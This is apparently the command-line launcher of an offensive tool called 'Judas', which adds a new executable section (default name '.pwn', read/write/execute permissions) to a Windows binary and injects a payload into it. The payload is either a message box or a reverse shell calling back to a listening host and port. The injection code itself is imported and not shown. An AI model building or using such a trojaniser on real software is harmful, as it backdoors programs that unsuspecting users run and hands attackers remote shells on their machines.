#! /usr/bin/env python3

import argparse
from judas import Judas
from wizard import run
banner = """
       __          __
      / /_  ______/ /___ ______
 __  / / / / / __  / __ `/ ___/
/ /_/ / /_/ / /_/ / /_/ (__  )
\____/\__,_/\__,_/\__,_/____/
"""
print(banner)

# Create the parser
parser = argparse.ArgumentParser(
    description='Inject payload into a windows binary file')

# Add the arguments
parser.add_argument('path',
                    metavar='path',
                    type=str,
                    help='path to the binary that you wish to inject')

parser.add_argument('-lP',
                    '--lport',
                    type=int,
                    metavar='port',
                    help='listening port for payload')

parser.add_argument('-lH',
                    '--lhost',
                    type=str,
                    metavar='ip',
                    help='listening host for payload')

parser.add_argument('-sS',
                    '--section_size',
                    type=int,
                    metavar='size',
                    help='size for section to be injected',
                    default=0x1000)

parser.add_argument('-pS',
                    '--page_size',
                    type=int,
                    metavar='size',
                    help='size for section to be injected',
                    default=0x1000)

parser.add_argument('-t',
                    '--type',
                    type=str,
                    metavar='type',
                    default='msg',
                    choices=['msg', 'rev'],
                    help='size for section to be injected')

parser.add_argument('-sP',
                    '--section_permissions',
                    type=int,
                    metavar='permissions',
                    help='permissions for section to be injected',
                    default=0xE0000000)

parser.add_argument('-sN',
                    '--section_name',
                    type=str,
                    metavar='name',
                    help='name for section to be injected',
                    default=".pwn")

parser.add_argument('-w',
                    '--wizard',
                    action='store_true',
                    help='run tool in wizard mode',
                    default=False)

parser.add_argument('-v',
                    '--verbose',
                    action='store_true',
                    help='print verbose output',
                    default=False)

args = parser.parse_args()
if args.wizard:
    args = run(args)

print("Adding new section...")
injected = Judas(args.type, args.path, args.section_name,
                 args.page_size, args.section_size, args.section_permissions, args.verbose, lhost=args.lhost, lport=args.lport)

injected.add_section()

print("Injecting payload...")
# insert_payload can take lhost and lport for rev

injected.insert_payload()
